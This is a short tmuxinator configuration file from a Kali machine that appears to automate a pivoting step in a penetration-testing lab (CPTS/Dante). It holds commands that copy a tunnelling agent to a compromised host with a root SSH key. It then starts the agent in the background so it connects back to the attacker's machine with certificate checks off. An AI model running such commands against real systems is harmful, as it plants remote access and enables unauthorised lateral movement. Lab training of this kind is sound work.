# /home/kali/.config/tmuxinator/cptsPH1.yml

name: dantePH1
root: ~/

windows:
  - PH 1:
      root: ~/
      layout: even-vertical
      panes:
        - Pivot Host1:
          - cl
          - sleep 15
          - cd Data/Subnet-1/NIX01-10.129.192.232
          - scp -i root_id_rsa /home/kali/Desktop/LinuxTools/agent root@$IP:/tmp/my_agent
          - #scp -i id_rsa /home/kali/Desktop/WindowsTools/agent.exe root@10.10.110.100:/tmp/my_agent.exe
          - ssh -i root_id_rsa root@$IP "nohup /tmp/my_agent -connect $myip:11601 -ignore-cert &"
